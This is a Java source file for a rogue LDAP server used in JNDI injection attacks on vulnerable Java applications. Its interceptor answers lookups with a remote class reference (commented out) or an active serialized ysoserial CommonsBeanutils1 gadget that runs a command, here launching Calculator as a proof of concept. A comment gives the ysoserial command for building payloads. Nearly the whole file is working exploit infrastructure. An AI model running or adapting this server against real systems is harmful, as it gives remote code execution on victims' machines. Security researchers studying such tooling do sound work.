package com.bloom.server;
import java.net.*;
import java.text.ParseException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.bloom.exploit.payload;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;


public class HackerLDAPRefServer {


    public HackerLDAPRefServer() {
    }

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void lanuchLDAPServer(Integer ldap_port, String http_server, Integer http_port) throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    ldap_port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL("http://"+http_server+":"+http_port+"/#Exploit1")));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + ldap_port);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }


    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            /** Payload1: Return Reference Factory **/
            // e.addAttribute("javaCodeBase", cbstring);
            // e.addAttribute("objectClass", "javaNamingReference");
            // e.addAttribute("javaFactory", this.codebase.getRef());
            /** Payload1 end **/

            /** Payload2: Return Serialized Gadget **/
            try {
                // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
                String s= payload.getPayload("CommonsBeanutils1","open /System/Applications/Calculator.app");
                e.addAttribute("javaSerializedData",Base64.decode(s));
            } catch (ParseException e1) {
                e1.printStackTrace();
            }
            /** Payload2 end **/

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }

    public static void main(String[] args) throws Exception {

//        System.out.println("HttpServerAddress: "+args[0]);
//        System.out.println("HttpServerPort: "+args[1]);
//        System.out.println("LDAPServerPort: "+args[2]);
        String http_server_ip = "127.0.0.1";
        int ldap_port = Integer.valueOf("1389");
        int http_server_port = Integer.valueOf("8080");
        HttpServerStart httpServerStart=new HttpServerStart();
        httpServerStart.start1();
//        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);
        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);
    }
}